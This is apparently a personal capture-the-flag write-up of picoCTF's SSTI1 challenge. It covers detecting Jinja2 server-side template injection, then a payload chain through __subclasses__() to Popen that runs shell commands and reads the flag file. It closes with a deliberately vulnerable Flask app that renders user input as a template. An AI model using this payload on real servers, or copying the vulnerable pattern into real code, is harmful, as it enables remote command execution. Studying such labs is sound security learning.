# SSTI1

[picoCTF](https://play.picoctf.org/practice/challenge/492)

### Web Exploitation

- This is web exploitation CTF.

- A web application running which outputs user input.

- so we try to figure out if input can be executed.

- typing `<script alert(1)</script>` did execute, we can do XSS.

- Since the application is not JS based and JS is only on the front end we can't do much. So we try to do SSTI (Server side template injection).

- We try to see which template engine is the server running. 

### Detection

- First we need to see if there can be a template injection. Most templates use symbols like `$ { } {{ }} {% %}` so if we input something similar we should get a response that is not usual like an error of execution of that template.

- You can use ``${{<%[%'"}}%\``  to see if  an error occurs. If it does then we can do template injection. But this can also blow your cover so try to be smart on this.

- Now we have to find out which template engine it is. When I opened the request in Burp suite I saw that response was from a Python server so I know that it is a python template. 

- ![image](/home/som/Downloads/template-decision-tree.png)

- this is how we decide which template it is. This does not cover all the templates. If you could find out with some other way what the language is you can narrow down the language search. 

- so since the packet told me the response was from python i tried `{{ 7*7}}`and result came back as 49. then `{{7*'7'})` returned `7777777` so i knew it was `jinja2` template engine. [Server-side template injection | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection) This explains that.

- Now we know this vulnerability exists.

---

### Exploitation

- Before we deep dive rad this [Exploiting server-side template injection vulnerabilities | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection/exploiting)

- Now here we know we are fighting jinja2 template engine. best way to learn is to look for common vulnerabilities and look through the documentation.

- In my research I found out about template variable. There are a few but only few were necessary. Now the jinja2 template runs on a sandbox and we need a way to get out of that sandbox. Something that can talk to the underlying os.

- In flask apps there is a special variable `g` to store information during a request that means it holds the ability to reference few other variables too one of which might have a function that can make a call outside the sandbox.



**TODO: learn more here**

- then `__class__` this returns class of an object.

- `__mro__` returns base class of a class.

- `__subclasses__()` is a method that list all the subclasses of a class.

- so now chain them together. `{{ g.__class__.__mro__[1].__subclasses__()}}`
  
  - `g.__class__` gives us the `<class 'object'>`
  
  - `g.__class__.__mro__` give `<class 'object'>, <class 'object'>`
  
  - we take the second object and look at the subclasses it has. `g.__class__.__mro__.__subclasses__()` this gives us a shit ton of function available.
  
  - I searched for `os`, `open`, `path`, `IO` and similar names.
  
  - then I found out the function `popen` and read about it. Then I searched for which comma was after it, it was 357 so `popen` was at 356th location.
  
  - `g.__class__.__mro__[1].__subclasses__()[356]('ls')` and it returned the address of the answer. Now we need to convert it to data.
  
  - We use communicate for that and some extra arguments. 
  
  - `g.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate()[0]` this show all the files in the current folder and there is a file named flag.
  
  - `g.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]` this gives us the actual flag and voila.

---

### Practice

- Here we will make a simple SSTI exploitable flask app in python.

- ```python
  from flask import Flask, request, render_template_string
  
  app = Flask(__name__)
  
  @app.route("/")
  def home():
      if request.args.get('c'):
          return render_template_string(request.args.get('c'))
      else:
          return "Bienvenue!"
  
  if __name__ == "__main__":
      app.run(debug=True)
  ```

- Save this, install python and run it.

- Now what ever you pass in the arguments `c=...`will be executed by the server
